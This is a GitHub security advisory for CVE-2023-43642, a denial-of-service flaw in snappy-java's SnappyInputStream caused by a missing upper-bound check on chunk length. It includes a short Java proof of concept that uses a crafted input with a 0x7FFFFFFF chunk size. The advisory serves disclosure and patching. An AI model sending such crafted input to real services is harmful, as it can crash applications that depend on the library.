# [H] snappy-java's missing upper bound check on chunk length can lead to Denial of Service (DoS) impact

## Summary
Severity: High
Advisory: GHSA-55g7-9cwv-5qfv
CVE: CVE-2023-43642
CWE: CWE-770
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2023-09-25
Source: https://github.com/advisories/GHSA-55g7-9cwv-5qfv
Type: github-advisory

## Affected
- Maven: `org.xerial.snappy:snappy-java` — affected >=0 <1.1.10.4

## Details
### Summary

snappy-java is a data compression library in Java. Its SnappyInputStream was found to be vulnerable to Denial of Service (DoS) attacks when decompressing data with a too-large chunk size. Due to missing upper bound check on chunk length, an unrecoverable fatal error can occur. 

### Scope

All versions of snappy-java including the latest released version 1.1.10.3.  A fix is applied in 1.1.10.4

### Details
While performing mitigation efforts related to [CVE-2023-34455](https://nvd.nist.gov/vuln/detail/CVE-2023-34455) in Confluent products, our Application Security team closely analyzed the fix that was accepted and merged into snappy-java version 1.1.10.1 in [this](https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea) commit. The check on [line 421](https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea#diff-c3e53610267092989965e8c7dd2d4417d355ff7f560f9e8075b365f32569079fR421) only attempts to check if chunkSize is not a negative value. We believe that this is an inadequate fix as it misses an upper-bounds check for overly positive values such as 0x7FFFFFFF (or (2,147,483,647 in decimal) before actually [attempting to allocate](https://github.com/xerial/snappy-java/commit/3bf67857fcf70d9eea56eed4af7c925671e8eaea#diff-c3e53610267092989965e8c7dd2d4417d355ff7f560f9e8075b365f32569079fR429) the provided unverified number of bytes via the “chunkSize” variable. This missing upper-bounds check can lead to the applications depending upon snappy-java to allocate an inappropriate number of bytes on the heap which can then cause an  java.lang.OutOfMemoryError exception. Under some specific conditions and contexts, this can lead to a Denial-of-Service (DoS) attack with a direct impact on the availability of the dependent implementations based on the usage of the snappy-java library for compression/decompression needs.

### PoC
Compile and run the following code:
```
package org.example;
import org.xerial.snappy.SnappyInputStream;

import java.io.*;

public class Main {

    public static void main(String[] args) throws IOException {
        byte[] data = {-126, 'S', 'N', 'A', 'P', 'P', 'Y', 0, 0, 0, 0, 0, 0, 0, 0, 0,(byte) 0x7f, (byte) 0xff, (byte) 0xff, (byte) 0xff};
        SnappyInputStream in = new SnappyInputStream(new ByteArrayInputStream(data));
        byte[] out = new byte[50];
        try {
            in.read(out);
        }
        catch (Exception ignored) {
        }
    }
}
```

### Impact
Denial of Service of applications dependent on snappy-java especially if `ExitOnOutOfMemoryError` or `CrashOnOutOfMemoryError` is configured on the JVM.

### Credits
Jan Werner, Mukul Khullar and Bharadwaj Machiraju from Confluent's Application Security team. 

We kindly request for a new CVE ID to be assigned once you acknowledge this vulnerability.

## References
- https://github.com/xerial/snappy-java/security/advisories/GHSA-55g7-9cwv-5qfv
- https://nvd.nist.gov/vuln/detail/CVE-2023-43642
- https://github.com/xerial/snappy-java/commit/9f8c3cf74223ed0a8a834134be9c917b9f10ceb5
- https://github.com/xerial/snappy-java
- https://github.com/xerial/snappy-java/releases/tag/v1.1.10.4
